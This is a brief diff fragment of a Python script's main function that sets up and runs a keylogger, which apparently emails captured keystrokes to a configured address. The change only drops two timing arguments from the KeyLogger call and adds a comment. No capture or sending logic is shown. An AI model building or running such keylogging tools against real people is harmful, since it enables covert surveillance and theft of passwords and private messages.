@@ -29,7 +29,7 @@ def main():
 
     # run the logger
     email = Email(my_email, to_email)
-    kl = KeyLogger(email, email_st=12, log_ft=5) 
+    kl = KeyLogger(email) # add arguments to adjust email and log time
     kl.run_keylogger()
 
    
